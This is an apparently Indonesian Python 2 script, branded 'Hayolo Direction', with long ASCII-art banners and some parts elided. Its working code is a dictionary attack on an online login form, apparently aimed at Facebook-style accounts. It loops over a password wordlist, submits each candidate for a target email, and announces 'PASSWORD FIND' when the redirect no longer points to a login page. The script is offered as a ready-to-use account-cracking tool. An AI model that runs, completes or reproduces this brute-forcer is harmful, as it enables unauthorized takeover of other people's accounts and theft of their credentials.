#!usr
# Hayolo Direction
# Still Alive And we will keep on fighting till the end
...
def banner():
    ...
    print " "
    runntxt(GL+"              Wellcome")
    runntxt(WW+"   ..................  HAYOLO DIRECTION")
    runntxt(WW+"     ....       Still Alive")
    runntxt(GL+"                   And We wiil")
    ...
    print GL+"  |••••••         === FANTASTIC ===         ••••••|"
    print GG+"  v=============================================v"
    print WW+"  |           Author Hayolo Direction           |"
    print GL+"  |   Still Alive And We Will Keep ON Fighting  |"
    print WW+"  |           TEAM : Hayolo Direction           |"
    print Y+"   |           INSTAGRAM: ahmadghozali.xyz       |"
    print GL+"  |---------------------------------------------|"
    print GL+"  |              Be Happy Be Enjoy              |"
    print GL+"  |---------------------------------------------|"
    print GG+"  v=============================================v"
    print GL+"  |•••••••••     HAYOLO Direction      •••••••••|"
    print GG+"  v=============================================v"
    print GG+"  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |  ____  ____  | || |      __      | || |  ____  ____  | || |     ____     | || |   _____      | || |     ____     | |
| | |_   ||   _| | || |     /  \     | || | |_  _||_  _| | || |   .'    `.   | || |  |_   _|     | || |   .'    `.   | |
| |   | |__| |   | || |    / /\ \    | || |   \ \  / /   | || |  /  .--.  \  | || |    | |       | || |  /  .--.  \  | |
| |   |  __  |   | || |   / ____ \   | || |    \ \/ /    | || |  | |    | |  | || |    | |   _   | || |  | |    | |  | |
| |  _| |  | |_  | || | _/ /    \ \_ | || |    _|  |_    | || |  \  `--'  /  | || |   _| |__/ |  | || |  \  `--'  /  | |
| | |____||____| | || ||____|  |____|| || |   |______|   | || |   `.____.'   | || |  |________|  | || |   `.____.'   | |
| |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' "                                

print wd+"         GUNAKAN DENGAN BIJAK!!! "
...
def pil():
                ...
                if g == 'y' or g == 'Y':
                    ...
                    print RR+"Yang bener dong su..."
                    pil()

def edit_wordlist():

        print GG+" "
        ed = str(raw_input("[?] Edit wordlist ga nih.? \033[96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
...
def main():
        ...
        print " "
def hayolo(hayolo_password):
  try:
 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+hayolo_password)
	sys.stdout.flush()
	...
	noobs.form['pass'] = hayolo_password
	tom = noobs.submit()
	mask = tom.geturl()
	if mask != login and (not 'login_attempt' in mask):
			...
			print "          P A S S W O R D  F I N D "
	         	...
	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(hayolo_password)
        	        print " "
      ...
      sys.exit()    	    
def life():
	global hayolo_password
	password_nob = open(password_list, "r")
	for hayolo_password in password_nob:
		password_nob = hayolo_password.replace("\n","")
		hayolo(hayolo_password)		
        ...
        -o:  -.......        ..       `:o-
         `:o:``....--        ..     `:o:`
           `:+/-`  `-        ..  `-/+:`
              `-/+///..````..://+/-`
                  `.-::////::-.` \033[91;1m
                \033[90;https://github.com/ahmadghozali-xyz\033[91;1m
             Powered by:\033[97m HAYOLO DIRECTION
      """
